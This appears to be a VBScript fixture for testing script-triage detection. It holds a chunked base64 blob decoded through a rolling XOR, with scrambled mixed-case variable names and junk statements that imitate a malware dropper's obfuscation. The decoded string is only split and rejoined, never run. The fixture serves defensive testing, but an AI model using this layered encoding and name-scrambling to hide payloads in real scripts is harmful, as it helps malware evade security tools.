Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_13949ef0 = "Mg8+QjFFIFAjHn8cbRhxA2Y5Sy5DLFg9EWYUfQlsM1U8UDUZfRRnF3YCYQlWJlQ7WD1OPRF5GHYSfRt9IlEyQClZLVEwVDVFMVQmG1Y/XC5BMl07T2E5dDhwJHAgXC9bOl04ZwRrHnAEOQ1xEnMebg9mAW8wWT0AYwJvH34XcB4zUmtaYgAxAWJXYR1oGnZLI1cjUyAaNRp7QnNLKRgoS35IZgN7GncHaw4gSSdRMFw1UX5JK0l4SXFFdVs/XipWI1A1Rxh5HnsVYVwUYQ97CWwfbCBBIwxtVGVdPw4+XWheIkQtQSR7C2oedksIMm47SC1fLHAgVTdbMlENRTBeKlg9Tj1xEHIuXSlIL0pnBj8ONlRlVTYDNRt/HmoWZAFmD3wIegNcLE05UWwkbyx5JXYZfwt8HW8KVh5rBXEDZhVmKkspdTFYK1s0RyZEKE0RcEl4QCITI0B1Qz9RNEw4ZxRgAWYDPlI9Xj9TfhpzAHARZQZuQDZUJw=="
Const Codec_13949ef0 = "base64_chunks|rolling_xor|44"

Function Base64_13949ef0(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_13949ef0", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_13949ef0 = outputBytes
End Function

Function Load_13949ef0()
  Dim partWidth, packedText
  partWidth = (Len(Material_13949ef0) + 3) \ 4
  packedText = Mid(Material_13949ef0, 1, partWidth) & Mid(Material_13949ef0, partWidth + 1, partWidth) & Mid(Material_13949ef0, partWidth * 2 + 1, partWidth) & Mid(Material_13949ef0, partWidth * 3 + 1)
  Load_13949ef0 = Base64_13949ef0(packedText)
End Function

Function Decode_13949ef0(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  previous = 68
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor previous
    previous = SoUrCeByTeS(ByTeInDeX)
  Next
  Decode_13949ef0 = result
End Function

Function Recover_13949ef0()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  NeUtRaL = LCase(UCase("Host"))
  SoUrCeByTeS = Load_13949ef0()
  Do
    DeCoDeDByTeS = Decode_13949ef0(SoUrCeByTeS)
    Exit Do
  Loop
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
  Recover_13949ef0 = DeScRiPtOrTeXt
End Function

Function Inspect_13949ef0()
  Dim fields
  fields = Split(Recover_13949ef0(), "|")
  Inspect_13949ef0 = Join(fields, "|")
End Function
